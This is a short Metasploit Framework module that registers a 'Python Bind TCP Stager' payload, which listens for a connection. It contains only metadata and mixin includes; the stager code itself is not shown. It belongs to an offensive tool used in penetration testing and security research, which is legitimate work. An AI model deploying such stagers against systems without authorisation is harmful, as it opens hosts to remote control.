##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 429

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Bind TCP Stager',
      'Description' => 'Listen for a connection',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => {'Payload' => ""}
    ))
  end
end
